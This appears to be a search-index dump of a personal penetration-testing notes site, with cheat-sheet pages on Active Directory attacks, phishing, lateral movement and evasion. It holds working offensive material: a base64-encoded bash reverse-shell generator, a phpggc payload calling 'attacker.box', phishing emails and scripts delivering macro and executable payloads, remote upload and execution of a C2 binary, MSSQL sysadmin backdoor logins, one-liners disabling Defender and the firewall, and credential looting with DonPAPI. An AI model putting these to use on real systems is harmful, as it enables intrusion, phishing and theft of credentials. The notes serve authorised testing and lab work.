format. Additional types are not mandated by the Conventional Commits specification, and have no implicit effect in Semantic Versioning (unless they include a BREAKING CHANGE). A scope may be provided to a commit’s type, to provide additional contextual information and is contained within parenthesis, e.g., feat(parser): add ability to parse arrays.\nRef: https://www.conventionalcommits.org/en/v1.0.0/"},"title":"versioning"},"/bazaar/linux/other-commands/":{"data":{"":"","#":"Other Linux Commands # find files and pretty print them find /home -type f -printf \"%f\\t%p\\t%u\\t%g\\t%m\\n\" 2\u003e/dev/null | column -t # find .php files which do not contain \"_SECURE_\" rg --files-without-match \"_SECURE_\" **/*.php "},"title":"Other commands"},"/bazaar/linux/reverse-shells/":{"data":{"":"","#":"Generate a quick bash reverse shell in python genshell.py#!/usr/bin/env python3 import base64 import sys import os if \"-h\" in sys.argv or \"--help\" in sys.argv or len(sys.argv) != 3: print(\"[!] INTERFACES:\") print(os.popen(\"ip a\").read().strip()) print(\"\") print(\"[!] Usage: genshell \u003cIP\u003e \u003cPORT\u003e\") exit(1) ip = sys.argv[1] port = sys.argv[2] rev_shell = f'bash -i \u003e\u0026 /dev/tcp/{ip}/{port} 0\u003e\u00261' print(f'[*] command: {rev_shell}') exec_cmd = f'echo {base64.b64encode(rev_shell.encode()).decode()} | base64 -d | /bin/bash' print(exec_cmd) "},"title":"Reverse Shells"},"/bazaar/linux/system-hardening/":{"data":{"":"","#":"OpenSnitch OpenSnitch is a GNU/Linux interactive application firewall inspired by Little Snitch. Ref: https://github.com/evilsocket/opensnitch\nWarning\nappindicators which is required for the system tray icon is buggy and seems to produce a lot of syslog errors: journalctl --since \"1 hour ago\"\nRecommend installing and using Tray Icons: Reloaded instead: https://extensions.gnome.org/extension/2890/tray-icons-reloaded/\nNote\nWorks more or less with VPNs… YMMV.\nOther speedup configs Caution\nTread at your own risk… A lot of these things can fuck-up your device and might be annoying to undo or fix easily. But we all have installation scripts and backups right…. right?!\nMonitor journalctl --since \"1 hour ago\" for bugs and application errors which might use up battery, or other hardware resources. Need to run as admin to see all messages otherwise you will only see logs related to your system.\ngnome-shell editor: dconf-editor\nTo look into:\nhttps://askubuntu.com/questions/346211/tracker-store-and-tracker-miner-fs-eating-up-my-cpu-on-every-startup Hardening scripts debian-cis Warning\nSome of these may not be desirable to have hardened on host machines.\nRef: https://github.com/ovh/debian-cis\n# Installation # need root to cp into /etc/default/cis-hardening cd debian-cis cp debian/default /etc/default/cis-hardening sed -i \"s#CIS_LIB_DIR=.*#CIS_LIB_DIR='$(pwd)'/lib#\" /etc/default/cis-hardening sed -i \"s#CIS_CHECKS_DIR=.*#CIS_CHECKS_DIR='$(pwd)'/bin/hardening#\" /etc/default/cis-hardening sed -i \"s#CIS_CONF_DIR=.*#CIS_CONF_DIR='$(pwd)'/etc#\" /etc/default/cis-hardening sed -i \"s#CIS_TMP_DIR=.*#CIS_TMP_DIR='$(pwd)'/tmp#\" /etc/default/cis-hardening # Audit everything ./bin/hardening.sh --audit-all # audit single item ./bin/hardening/4.4_logrotate_permissions.sh --audit # Apply a fix / harden ./bin/hardening/4.4_logrotate_permissions.sh --apply "},"title":"system hardening"},"/bazaar/other-cheatsheets/":{"data":{"":"","#":"General https://www.thehacker.recipes/ (Better than hacktricks imo) https://viperone.gitbook.io/pentest-everything (great for AD stuff) hacktricks https://www.ired.team/ - always find gems in here. More oldschool but pretty awesome and well explained https://exploit-notes.hdks.org/ (found when looking for something specific, looks interesting) https://watchdogsacademy.gitbook.io/attacking-active-directory (found when looking at mssql stuff, also has cool shit I think) https://werebug.com/pentest-cheatsheet/ - cool layout for a cheatsheet, mostly basic content https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition - pretty well maintained cheatsheet https://notes.qazeer.io/ Mindmaps https://orange-cyberdefense.github.io/ocd-mindmaps/ (It looks cool but I’ve honestly never used this…) "},"title":"++ cyber cheatsheets"},"/bazaar/other/password-cracking/":{"data":{"":"","#":"Common Password generation Password generation using Regex # tool installation # pipx install exrex exrex \"((W|w)inter|(S|s)ummer|(F|f)all|(A|a)utumn|(S|s)pring)20(16|17|18|19|20)\" \u003e seasons_months.txt exrex \"((J|j)anuary|(F|f)ebruary|(M|m)arch|(A|a)pril|(M|m)ay|(J|j)une|(J|j)uly|(A|a)ugust|(S|s)eptember|(O|o)ctober|(N|n)ovember|(D|d)ecember)20(16|17|18|19|20)\" \u003e\u003e seasons_months.txt Keyboard Walks Generating keyboard walks based on keyboard layout:\n# https://github.com/hashcat/kwprocessor kwp -z basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route \u003e keymap.txt Ref: https://cyberarms.wordpress.com/2018/02/13/creating-hashcat-keymap-walking-password-wordlists/\nRef https://github.com/Mebus/cupp https://specopssoft.com/blog/predictable-passwords-seasons-and-months/ https://cyberarms.wordpress.com/2018/02/13/creating-hashcat-keymap-walking-password-wordlists/ "},"title":"Password Cracking"},"/bazaar/phishing/":{"data":{"":"","#":" Warning\nWIP… Only added basic commmands now that seem to work quite well for test environments with basic security controls aka MS Defender AV.\nThese most likely wont work against any EDR solution… DYOR.\nWord Macros Important\ndocx word docs don’t execute macros (they may be contained in the document but in read only mode), create a docm or doc instead\nFocus on hta, docm, and js payloads\nMacro pack MacroPack Community is a tool used to automatize obfuscation and generation of retro formats such as MS Office documents or VBS like format. It also handles various shortcuts formats.\n# List all supported file formats macro_pack.exe --listformats # List all available templates macro_pack.exe --listtemplates # Craft a payload ... Note\nThe EmbedExe template has been quite good in the past as it allows you to provide you C2 payload directly via exe or bin , utilising either a smb beacon or http beacon.\nWhen using the smb beacon, you can try and spray the network to guess if its running or not\nSending Emails: swaks To send emails to a mail service (eg. SMTP, IMAP, etc) from the command line, swaks is your go to tool.\nIt provides nice features for attaching documents, spoofing senders, etc.\nSending emails with payloads as attachments # links in body can be used if the user is going to click on it # otherwise you can also attach files to it # --server : mail server # --attach @totally-not-malicious.docm : attach the file name `totally-not-malicious.docm` to the email # --suppress-data : don't print the attachment back to you swaks --from vladimir.putin@target.com --to sam.altman@target.com --header 'Subject: Company Notification' --body 'Hi Sam, we want to hear from you! Please complete the following survey. https://mywebsite.com/mysurvey.hta' --server 10.10.10.10 --attach @totally-not-malicious.docm --suppress-data Refs https://github.com/cymerkabrol/doc-macro-exploit https://github.com/itm4n/VBA-RunPE https://github.com/sevagas/macro_pack https://github.com/Inf0secRabbit/BadAssMacros "},"title":"Phishing"},"/bazaar/web-exploitation/php/":{"data":{"":"","#":"Online PHP runner with various PHP version https://onlinephp.io/\nDangerous functions htmlspecialchars htmlspecialchars — Convert special characters to HTML entities Ref: https://www.php.net/manual/en/function.htmlspecialchars.php\nDepending on the php version, the defaults my be different and not encode all characters. For example ' (single quote) is not converted by default in all PHP versions:\nHTML special chars demo with PHP v7.4.33 vs PHP v8.2.20 Deserialization with phpggc PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically.\nIf you need to find libraries used by the application, look for composer.json or composer.lock\n# show list of gadget chains ./phpggc -l # deserialization via phar file # (phar doesnt care about the extension) # ZendFramework/RCE1 gadget selected here, but can be anything that supports __destruct or __wakeup vector ./phpggc -p phar -o /tmp/revshell.anything ZendFramework/RCE1 system \"curl http://attacker.box/phar\" "},"title":"PHP"},"/bazaar/windows/":{"data":{"":""},"title":"Windows"},"/bazaar/windows/active-directory/":{"data":{"":"Other tools:\nenum4linux-ng "},"title":"Active Directory"},"/bazaar/windows/active-directory/ad-enumeration/":{"data":{"":"","#":" Note\nMachine accounts are Domain accounts and can be used to authenticate and talk to LDAP.\nAD enumeration with powerview / powerview.py # Get all users in the current domain Get-DomainUser | select -ExpandProperty cn # Get all computers in the current domain Get-DomainComputer # Get all domains in current forest Get-ForestDomain # Get domain/forest trusts Get-DomainTrust Get-ForestTrust # Get information for the DA group Get-DomainGroup \"Domain Admins\" # Find members of the DA group Get-DomainGroupMember \"Domain Admins\" | select -ExpandProperty membername # Find interesting shares in the domain, ignore default shares, and check access Find-DomainShare -ExcludeStandard -ExcludePrint -ExcludeIPC -CheckShareAccess # Get OUs for current domain Get-DomainOU -FullData # Get computers in an OU # %{} is a looping statement Get-DomainOU -name Servers | %{ Get-DomainComputer -SearchBase $_.distinguishedname } | select dnshostname # Get GPOs applied to a specific OU Get-DomainOU *WS* | select gplink Get-DomainGPO -Name \"{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}\" # Get Restricted Groups set via GPOs, look for interesting group memberships forced via domain Get-DomainGPOLocalGroup -ResolveMembersToSIDs | select GPODisplayName, GroupName, GroupMemberOf, GroupMembers # Get the computers where users are part of a local group through a GPO restricted group Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName # Find principals that can create new GPOs in the domain Get-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=targetdomain,DC=com\" -ResolveGUIDs | ?{ $_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier # Find principals that can link GPOs to OUs Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq \"GP-Link\" -and $_.ActiveDirectoryRights -match \"WriteProperty\" } | select ObjectDN, SecurityIdentifier # Get incoming ACL for a specific object Get-DomainObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs | Select IdentityReference,ActiveDirectoryRights # Find interesting ACLs for the entire domain, show in a readable (left-to-right) format Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains \"DnsAdmins\"} | ft # Get interesting outgoing ACLs for a specific user or group # ?{} is a filter statement Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match \"Domain Admins\"} | select ObjectDN,ActiveDirectoryRights Powerview from Linux System: powerview.py PowerView.py is an alternative for the awesome original PowerView.ps1 script. Most of the modules used in PowerView are available here ( some of the flags are changed ). Main goal is to achieve interactive session without having to repeatedly authenticate to ldap.\nRef: https://github.com/aniqfakhrul/powerview.py\nWarning\nIt might not return all properties by default, recommended to run all commands with -Properties * to get all the details like LAPS password for machines (if you have the perms) or delegation metadata like msDS-AllowedToActOnBehalfOfOtherIdentity\n# running over proxychains and using powerview to connect to LDAP of dc01.pinecorp.internal proxychains4 -q powerview 'john.doe':'AmazingP@ss'@dc01.pinecorp.internal --use-ldap -ns 10.10.10.10 # supports some functionality to help with OPSEC... althought never tested so not sure what they do --no-admin-check Skip admin check when first logging in --obfuscate Obfuscate search filter Modules available: https://github.com/aniqfakhrul/powerview.py?tab=readme-ov-file#module-available-so-far\nADSearch # List users execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"objectCategory=user\" # List admins execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=group)(cn=*Admins))\" # List MS SQL Admins execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=group)(cn=MS SQL Admins))\" --attributes cn,member # kerberoasting execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=user)(servicePrincipalName=*))\" --attributes cn,servicePrincipalName,samAccountName # as-rep roasting execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" --attributes cn,distinguishedname,samaccountname # unconstrained delegation execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" --attributes samaccountname,dnshostname # constrained delegation execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=computer)(msds-allowedtodelegateto=*))\" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json Other alternatives https://github.com/The-Viper-One/PsMapExec "},"title":"AD Enumeration"},"/bazaar/windows/active-directory/lateral-movement/":{"data":{"":"","#":"netexec Upload and execute file on target(s):\n#TARGET=\"topwn.txt\" #TARGET=\"computers.txt\" TARGET=\"mx01.target.local\" #TARGET=\"srv.target.local\" USER=\"asdf_da\" #USER=\"users.txt\" #PASSHASH=\"-p myshittypass\" #PASSHASH=\"-H \\\"44444444444444444444444444444444\\\"\" PASSHASH=\"-H ab7b75ff84475be2e8c4dcb7390955c3:ab7b75ff84475be2e8c4dcb7390955c3\" SOURCE_BIN=\"/home/kali/webserver/demon.x64.exe\" # full path TARGET_BIN=\"cmon.exe\" # just the bin name and ext EXEC_METHOD=\"--exec-method atexec\" #EXEC_METHOD=\"\" EXTRA=\"\" #EXTRA=\"--laps\" #EXTRA=\"--laps MyLocalAdministrator\" netexec smb $TARGET -u \"$USER\" $PASSHASH --put-file \"$SOURCE_BIN\" \"\\\\Windows\\\\Temp\\\\$TARGET_BIN\" -x \"C:\\\\Windows\\\\Temp\\\\$TARGET_BIN\" $EXEC_METHOD $EXTRA WinRm : Enter-PSSession / evil-winrm ports: 5985 (HTTP) and 5986 (HTTPS) (Below Windows 7: 80 and 443) # finding open ports nmap -p5985,5986 -iL computers.txt -Pn -v # Connect from Linux evil-winrm -i Server01 -u USER -p PASS # Connect from Windows Enter-PSSession Server01 # automation (python3) # pip install pywinrm # (see ref for optional deps) # ref: https://pypi.org/project/pywinrm/ import winrm sess = winrm.Session( '10.10.10.10', auth=( 'administrator', 'badminton' ), transport='ntlm' ) # run powershell command r = session.run_ps(\"whoami\") print(r.std_out) print(r.std_err) # run print(session.run(\"type c://users//mike//Desktop//flag.txt\").std_out) About WinRm Using the WS-Management protocol, Windows PowerShell remoting lets you run any Windows PowerShell command on one or more remote computers.\nTo start an interactive session with a single remote computer, use the Enter-PSSession cmdlet. For example, to start an interactive session with the Server01 remote computer, type:\nEnter-PSSession Server01 ~ Microsoft Docs1\nMicrosoft has implemented the WS-Management standard in Windows Remote Management 1.1 (WinRM)\nBy default WinRM HTTP uses port 80 and HTTPS uses port 443. On Windows 7 and higher the default ports are 5985 and 5986, respectively. ~ Wikipedia2\nhttps://learn.microsoft.com/en-us/powershell/scripting/security/remoting/running-remote-commands?view=powershell-7.4#windows-powershell-remoting ↩︎\nhttps://en.wikipedia.org/wiki/WS-Management ↩︎"},"title":"Lateral Movement"},"/bazaar/windows/active-directory/mssql/":{"data":{"":"","#":"General Guest Authentication can be allowed. If so, check if you can impersonate other users. Look for linked servers, the user you can login as might be different. Also you may be able to impersonate someone else there If you’re on a windows server, look for inetpub config files Impacket-MSSQL # authentication via windows auth impacket-mssqlclient LAB/myuser:mypass123@sql.lab.local -windows-auth # mssqlclient recon enum_links enum_logins enum_impersonate Helper proxychains4 -q impacket-mssqlclient LAB/myuser:mypass123@sql.lab.local -windows-auth Impacket v0.12.0.dev1 - Copyright 2023 Fortra [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(SQL01): Line 1: Changed database context to 'master'. [*] INFO(SQL01): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (110 2789) [!] Press help for extra shell commands SQL (LAB\\myuser dbo@master)\u003e help lcd {path} - changes the current local directory to {path} exit - terminates the server process (and this session) enable_xp_cmdshell - you know what it means disable_xp_cmdshell - you know what it means enum_db - enum databases enum_links - enum linked servers enum_impersonate - check logins that can be impersonated enum_logins - enum login users enum_users - enum current db users enum_owner - enum db owner exec_as_user {user} - impersonate with execute as user exec_as_login {login} - impersonate with execute as login xp_cmdshell {cmd} - executes cmd using xp_cmdshell xp_dirtree {path} - executes xp_dirtree on the path sp_start_job {cmd} - executes cmd using the sql server agent (blind) use_link {link} - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step) ! {cmd} - executes a local shell cmd show_query - show query mask_query - mask query SQL Commands # Current login name - ie. the user you're logged in as # if you are using windows auth, this should be something like LAB\\user SELECT SYSTEM_USER; # The database user (gives you an idea of the permissions your authed user has) SELECT USER; # list databases SELECT name FROM master..sysdatabases; # list linked servers EXEC sp_linkedservers; # list logins available for impersonation SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; # check if XP_CMDSHELL is enabled SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'; # enable XP_CMDSHELL # requires privileges EXEC sp_configure 'show advanced options', 1 RECONFIGURE EXEC sp_configure 'xp_cmdshell', 1 RECONFIGURE EXEC xp_cmdshell 'whoami' # UNC Path injection - capture with responder, smbserver, ntmrelayx or equivalent EXEC master..xp_dirtree '\\\\10.10.10.10\\share\\test.txt'; SQL Commands: Backdoor Make new database login (username TESTUSER, password L0ngP4ss123), map it to the db_owner and assign the sysadmin role:\nCREATE LOGIN [TESTUSER] WITH PASSWORD=N'L0ngP4ss123!'; CREATE USER [TESTUSER] FOR LOGIN [TESTUSER]; ALTER ROLE [db_owner] ADD MEMBER [TESTUSER]; EXEC master..sp_addrolemember @rolename=N'db_owner', @membername=N'TESTUSER'; EXEC master..sp_addsrvrolemember @rolename=N'sysadmin', @loginame=N'TESTUSER'; EXEC master..sp_addremotelogin 'SQLSRV01\\SQLEXPRESS', 'TESTUSER'; References and tools https://ppn.snovvcrash.rocks/pentest/infrastructure/dbms/mssql https://github.com/lefayjey/SharpSQLPwn https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet https://watchdogsacademy.gitbook.io/attacking-active-directory/mssql-servers-exploitation/mssql-trusted-links https://github.com/quentinhardy/msdat "},"title":"MSSQL"},"/bazaar/windows/defence-evasion/":{"data":{"":"","#":" Caution\nOnly use these in controlled test environments which can be reset easily (eg. CTFs, boot2root, Offsec Exams)\nDisabling defences Disable defender, all firewall rules and set execution policy to unrestricted:\nSet-ExecutionPolicy Unrestricted;Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference; Execution Policy blocking commands powershell -noexit -ExecutionPolicy Bypass [optional cmd you wish to run] # show execution policy Get-ExecutionPolicy # remove execution policy Set-ExecutionPolicy Unrestricted Firewall # Disable all Firewall profiles (Requires Admin privileges). Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False Set-NetFirewallProfile -Enabled False Defender # Turn off everything and set exclusion to \"C:\\Windows\\Temp\" Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference # ----- # Check if Defender is enabled Get-MpComputerStatus Get-MpComputerStatus | Select AntivirusEnabled # Check if defensive modules are enabled Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL # Check if tamper protection is enabled Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL # ----- # Disables realtime monitoring Set-MpPreference -DisableRealtimeMonitoring $true # Disables scanning for downloaded files or attachments Set-MpPreference -DisableIOAVProtection $true # Disable behaviour monitoring Set-MPPreference -DisableBehaviourMonitoring $true # Make exclusion for a certain folder Add-MpPreference -ExclusionPath \"C:\\Windows\\Temp\" # Disables cloud detection Set-MPPreference -DisableBlockAtFirstSeen $true # Disables scanning of .pst and other email formats Set-MPPreference -DisableEmailScanning $true # Disables script scanning during malware scans Set-MPPReference -DisableScriptScanning $true # Exclude files by extension Set-MpPreference -ExclusionExtension \"ps1\" Ref: https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender#firewall\nAppLocker C:\\windows\\tasks C:\\Windows\\System32\\spool\\drivers\\color Ref: https://github.com/api0cradle/UltimateAppLockerByPassList/tree/master?tab=readme-ov-file\nAppLocker: Finding writeable directories # Look for writeable paths in the C:\\windows directory $a = Get-ChildItem \"c:\\windows\\\" -recurse -ErrorAction SilentlyContinue $a | % { $fileName = $_.fullname $acls = get-acl $fileName -ErrorAction SilentlyContinue | select -exp access | ? {$_.filesystemrights -match \"full|modify|write\" -and $_.identityreference -match \"authenticated users|everyone|$env:username\"} if($acls -ne $null) { [pscustomobject]@{ filename = $fileName user = $acls | select -exp identityreference } } } UAC Bypass The repo below has a great list of UAC bypasses to use in various condition (GUI, DLL hijack, etc). Easily modifiable to create a BOF or tool which does the same thing.\nDefeating Windows User Account Control Ref: https://github.com/hfiref0x/UACME"},"title":"Defence Evasion"},"/bazaar/windows/forensics/":{"data":{"":"","#":"Event logs # list event logs Get-EventLog -List # search eventlogs Get-EventLog -LogName \"NAME\" | where {$_.Message -like '*CUSTOM*'} | select Message | format-table -wrap # same same but different Get-EventLog -LogName \"NAME\" | where {$_.Message -like '*CUSTOM*'} | select Message | fl Network Packet Capture Note\nWindows now ships with pktmon which contains a lot of the below funtionality builtin. Worth a look. Ref: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/pktmon\nThe Windows netsh built-in utility can be used to the traffic of the local system. The network capture will be exported in the ETL format:\n# Captures the local network traffic, optionally to the specified IP. netsh trace start capture=yes [tracefile=\u003cOUTPUT_ETL\u003e] [IPv4.Address=\u003cIP\u003e] # netsh trace start capture=yes report=disabled # Stops the network capture. netsh trace stop Convert to pcap using etl2pcapng Windows: https://github.com/microsoft/etl2pcapng\nLinux: https://github.com/aaptel/etl2pcap.git\nMerge multiple pcaps together # linux mergecap -w \u003cnew pcap\u003e \u003cpcap 1\u003e \u003cpcap 2\u003e [...] "},"title":"Forensics"},"/bazaar/windows/misc-snippets/":{"data":{"":"","other-useful-commands#Other useful commands":"Windows # Windows useful commands # list named pipes ls \\\\.\\pipe\\ # Find all shares, List share content and cat remote file on a share net view \\\\10.10.10.10 /all Get-SmbShare -CimSession \"10.10.10.10\" IncludeHidden ls \\\\10.10.10.10\\SYSVOL\\ cat \\\\10.10.10.10\\public\\asdf.txt # shares on local machines net shares Get-SMBShare -IncludeHidden # Ping scan in cmd (for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find \"Reply\" Linux # quick way to get all IPs for computers on the domain from a list of domain names # replace 10.10.10.10 with the DNS server (most likely the domain controller) proxychains4 -q bash -c 'for computer in `cat computers.txt`; do dig +noall +answer +tcp @10.10.10.10 \"$computer\" ; done' | tee dig-computers.txt ","running-tools-from-non-domain-joined-machines#Running tools from Non-Domain Joined Machines":" Note\nTools may require additional environment variables, parameters and co to be set. You may also have issues with DNS if your routing is not set properly\nWarning\nThe initial command does not check if the credentials are valid. Credentials are only checked during authentication when other tools are ran.\n# Create a powershell instance running as the DOMAIN\\USER account runas /netonly /user:DOMAIN\\USER \"powershell.exe -exec bypass\" # check if the credentials are valid for example by running ls on a share you know if open and readable ls \\\\\u003cdomain-controller\u003e\\SYSVOL\\ # run commands that will make network communications Enter-PSSession -ComputerName ... Sharphound.exe "},"title":"Misc Snippets"},"/bazaar/windows/outlook-exchange-server/":{"data":{"":"","#":"Using Python to send Mail via the Outlook web interface Info\nquick download: git clone https://gist.github.com/fyxme/7dd838dc406c3b76ee722b89e5893d33\nSending Mail via the Outlook web interface using NTLM and Python:\nsend-mail.py# installing requirements # pip install exchangelib from exchangelib import Configuration, Credentials, Account, Message, Mailbox, FileAttachment,DELEGATE, HTMLBody import sys, json # bypass SSL from exchangelib.protocol import BaseProtocol, NoVerifyHTTPAdapter BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter if __name__ == \"__main__\": U = 'LAB\\\\myuser' P = 'England1950' malicious_payload_url = \"http://10.10.14.5:8080/payload.x64.exe\" ews_url = 'https://10.10.10.10/EWS/Exchange.asmx' ews_auth_type = 'NTLM' primary_smtp_address = 'myuser@lab.local' cred = Credentials(U, P) config = Configuration(service_endpoint=ews_url, credentials=cred, auth_type=ews_auth_type) acc = Account( primary_smtp_address=primary_smtp_address, config=config, autodiscover=False, access_type=DELEGATE, ) m = Message( account=acc, subject='Getting back to you', #body= '', body = HTMLBody(f'\u003chtml\u003e\u003cbody\u003e\u003ca href=\"{malicious_payload_url}\"\u003eHi, this is the new doc you wanted.. Glhf\u003c/a\u003e\u003c/body\u003e\u003c/html\u003e'), to_recipients=[ Mailbox(email_address='target@lab.local'), Mailbox(email_address='another@lab.local'), ], cc_recipients=[ # Mailbox(email_address='another@lab.local'), ], #bcc_recipients=['another_mail@gmail.com'] # you can use just a string list. ) #m.attach(FileAttachment(name='C:\\\\Temp\\\\payload.txt', content='string'.encode('utf-8'))) m.send() "},"title":"Outlook Exchange Server"},"/bazaar/windows/post-exploitation--looting/":{"data":{"":"","#":" Tbd\nLooting secrets with DonPAPI Important\nYou need to provide a password file containing username and password so DonPAPI can decrypt the encrypted files using masterkeys and what not. Folders/Files under C:\\Users\\\u003cuser\u003e\\AppData\\Local\\Microsoft\\Credentials are hidden. You need to use dir /f or Get-ChildItem -force to see them. donpapi collect -t target.lab.local -u adminuser -H ab7b75ff84475be2e8c4dcb7390955c3:ab7b75ff84475be2e8c4dcb7390955c3 -d lab.local --pwdfile ./creds.txt Example pwdfile:\ncreds.txtjane.doe:World123! octave:RubberTrain99 john.elton:Ilovemusic1723 Ref: https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#practice\nDCSync Errors The distinguished name specified for this replication operation is invalid.\nYou don’t have perms.\nRef: https://blog.spookysec.net/domain-controller-sync/"},"title":"Post Exploitation \u0026 Looting"},"/bazaar/windows/privilege-escalation/":{"data":{"":"","#":"Automated Scanners tldr: Run sharpup first. If nothing found, run winpeas. SharpUp good, Winpeas ok More shit from Winpeas but takes longer and lots of garbage data from it. Also sometimes misses easy wins for me. Also seatbelt. Run all checks: Seatbelt.exe -group=all -full icacls DACLs explained icacls c:\\windows\\* Displays or modifies discretionary access control lists (DACLs) on specified files, and applies stored DACLs to files in specified directories. Ref: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls\nToken Privileges # run whoami /priv # check against table in repo below Ref: https://github.com/gtworek/Priv2Admin"},"title":"Privilege Escalation"},"/code/":{"data":{"":" Important\nThe layout of this section is a work in progress. A lot remains to be updated…\nTldr\nTools, code and other research stuff that I’ve made public. Content ordered using a single iteration of bogosort…","latest-code#latest code":"Developing new BOFs and improving old ones to extend open-source C2 capabilities:\nportscanbof | A Port Scanning BOF (COFF) that replicates Cobalt Strike’s Port Scanning functionality. Also includes a ping scanner. enumpwshhistbof | enumpwshhist is a Beacon Object File (BOF) that enumerates and finds sensitive information in PowerShell history files. havoc-runall-poc | A Havoc Module to run commands on all connected agents. ","research#research":"github (ext) BSD rootkit | a BSD rootkit and rootkit detector (written for research \u0026 education) silentbook | Proof-of-Concept app allowing encrypted messaging over Facebook messenger using AES-256 encryption CRC-32 hash collider | Naive bruteforce attack to find a CRC-32 hash collision based on a provided CRC-32 value and a charset. CRC-32 is not a cryptographic hash function. There are mathematical ways to reverse the hash value to a valid input. For more information, see the following tool. gists (ext) minimalcj.go | Golang Minimal CookieJar Implementation which always returns all cookies, regardless of domain or url (Insecure but useful for testing or writing POCs) webserver.go | Simple Golang webserver serving files from a directory and logging all incoming requests (ip, headers and body content) replay-http.go | Simple Golang tool to replay an http request from a txt file. whoami.go | Golang webserver which echo’s the request back to you and prints your IP address. sqlmap-proxy.go | Golang proxy example to abuse more complex SQL injections which may not be picked up by sqlmap. For example, SQL injections in CTF challenges. ","tools#tools":" dreamcatcher | a TCP listener which allows the same port to be used as a HTTP file server (similarly to python’s SimpleHTTPServer) and handle’s other TCP connections similarly to netcat. blistener | a Blind-XSS listener with javascript payloads to retrieve the target user’s browser data including cookies, local/session storage, html code (and optionally a screenshot) of current page (also works as a HTTP listener) genx | a fast alternative domain name generator to help in generating potential subdomains of a target. Useful when starting recon on a domain. dnsfaster | a tool to benchmark DNS resolvers in order to find resolvers with the highest speed and accuracy. short domain finder | a golang application which aims to find the shortest available domain based on user parameters (ie. length, domain extension). How I found this domain "},"title":"Code"},"/minis/":{"data":{"":" Note\nThis section is for mini pieces of writing about various topics which I don’t consider articles. See it as a place for rambling about small things, failed research and more… Somewhat like a twitter section on a blog."},"title":"minis"},"/minis/create-infinite-email-aliases-using-cloudflare-email-routing/":{"data":{"":"I did it… I finally passed the big 30…. 30000 unread emails!\nI would like to thank my pre-school teacher Jacky, Martha our cat lady neighbour who said I wouldn’t make it and Jacob, my imaginary friend with one eye. Many years of signing up to random garbage and being too lenient has led me to this. But today this changes…\nWhile I’ve created and use many different email addresses to try and limit the garbage, I’ve wanted to move to an easier to manage solution that has the following features:\nallows me to create unlimited aliases easily so I can filter spam messages or addresses that I no longer want to receive and have the ability to identify leaks if any were to happen (ie. garbage.com@mydomain.com is breached, hackers use the email to send spam/phishing to it which I can pinpoint easily to garbage.com). be relatively cheap allows me to create or use multiple domains so I can filter additionally based on trash levels. (ie. level 1 trash goes to domain1, level 2 trash goes to domain2 and super trash goes to thisdomainwillberotatedsoon) Notice I haven’t mentioned email privacy in the above. While I value privacy and believe long term I will incorporate it into the above solution, I’m currently looking for a solution that provides improved security and peace of mind. I also have plans to improve my self-hosted setup in the future and will include email aliasing or an equivalent solution. However, for the time being, I believe this might be the easiest and cheapest solution to setup and play around with.\nThe solution I’m talking about is Cloudflare email routing which allows you to 